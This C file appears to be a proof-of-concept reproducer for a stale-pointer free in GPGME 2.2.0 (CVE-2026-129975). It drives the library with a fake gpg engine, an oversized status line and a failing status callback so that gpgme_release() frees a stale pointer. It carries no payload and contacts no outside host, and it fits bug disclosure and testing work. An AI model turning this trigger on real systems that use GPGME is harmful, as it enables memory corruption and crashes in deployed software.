/* Real GPGME 2.2.0 trigger for CVE-2026-129975.
 *
 * Uses only public APIs: gpgme_set_engine_info() points at a loopback fake
 * gpg, gpgme_set_status_cb() supplies the monitor callback whose error takes
 * the pinned early-return at engine-gpg.c:1549-1552. A >1024-byte status line
 * forces realloc at :1493-1494; gpgme_release() then frees the stale pointer.
 */
#include <gpgme.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int cb_calls;

static gpgme_error_t
failing_status_cb (void *opaque, const char *keyword, const char *args)
{
  (void)opaque;
  cb_calls++;
  fprintf (stderr, "status_cb call=%d keyword=%s arglen=%zu byte[1000]=0x%02x\n",
           cb_calls, keyword, strlen (args),
           strlen (args) > 1000 ? (unsigned char) args[1000] : 0);
  /* Only the long status line fails; short-line controls stay clean.  */
  if (strlen (args) > 500)
    return gpg_error (GPG_ERR_GENERAL);
  return 0;
}

int
main (int argc, char **argv)
{
  gpgme_ctx_t ctx = NULL;
  gpgme_key_t key;
  gpgme_error_t err;
  const char *version;

  if (argc != 2)
    {
      fprintf (stderr, "usage: %s FAKE_GPG_PATH\n", argv[0]);
      return 2;
    }

  version = gpgme_check_version (NULL);
  if (!version)
    {
      fprintf (stderr, "check_version failed\n");
      return 2;
    }
  fprintf (stderr, "gpgme version=%s\n", version);
  err = gpgme_set_engine_info (GPGME_PROTOCOL_OpenPGP, argv[1], NULL);
  if (err)
    {
      fprintf (stderr, "set_engine_info failed: %s\n", gpgme_strerror (err));
      return 2;
    }
  err = gpgme_new (&ctx);
  if (err)
    {
      fprintf (stderr, "gpgme_new failed: %s\n", gpgme_strerror (err));
      return 2;
    }
  gpgme_set_ctx_flag (ctx, "full-status", "1");
  gpgme_set_status_cb (ctx, failing_status_cb, NULL);

  err = gpgme_op_keylist_start (ctx, NULL, 0);
  fprintf (stderr, "keylist_start err=%s\n", gpgme_strerror (err));
  while (!err)
    {
      err = gpgme_op_keylist_next (ctx, &key);
      if (!err)
        gpgme_key_release (key);
    }
  fprintf (stderr, "keylist_end err=%s cb_calls=%d\n",
           gpgme_strerror (err), cb_calls);
  gpgme_release (ctx);
  puts ("release done");
  return 0;
}
